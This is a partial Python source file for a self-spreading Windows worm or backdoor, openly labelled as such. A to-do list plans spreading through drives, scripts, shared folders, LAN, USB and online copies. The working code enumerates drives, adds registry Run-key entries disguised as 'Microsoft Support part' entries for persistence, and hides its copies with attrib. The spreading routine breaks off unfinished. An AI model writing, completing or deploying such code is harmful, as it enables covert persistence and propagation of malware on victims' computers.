#!C:\Python35\python3.exe #Because I have many versions on my pc :D
# ToDo list :
#   1)Spread in drivers,add to startup and continueos check (✘)
#   2)Spread in scripts by injecting [py/pl/ps1...]         (✘)
#   3)Spread in shared folders                              (✘)
#   4)Spread in lan                                         (✘)
#   5)Spread in usb                                         (✘)
#   6)Make a copy of itself online and use it in spreading  (✘)
#   7)[Advanced]Convert itself to executable and inject..   (✘)
#   8)...Still thinking :D
#
#       Note:Most of the functions would be for windows or all of it
#
import os,string,random,sys
from winreg import *

#Get the drivers on the pc
def drivers():
    dirs = []
    for i in string.ascii_uppercase:
        if os.path.isdir( i+":" ) == True:
            dirs.append( i+":" )
    return dirs

#Add each copy of the backdoor to the startup
def Startup(worms):
    for worm in worms:
        hiddenPath = os.getcwd()
        hiddenPath = '\"' + hiddenPath + '\"'
        regPath = os.getcwd()
        regPath = regPath + r"\%s"%worm
        regPath = '\"' + regPath + '\"'
        regConnect = ConnectRegistry(None, HKEY_LOCAL_MACHINE)
        regKey = OpenKey(regConnect, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
        SetValueEx(regKey,"Microsoft Support part "+str(random.randint(0,100)),0, REG_SZ, r"" + regPath)
        #Hide the file
        os.system("attrib +h " + hiddenPath)

#Make a copys of the backdoor to the pc drivers
def spread_in_drivers():
    dirs = drivers()
    current_driver = os.getcwd().split(":")[0]
    copies = []
    name=sys.argv[0]
    #I will Continue later..
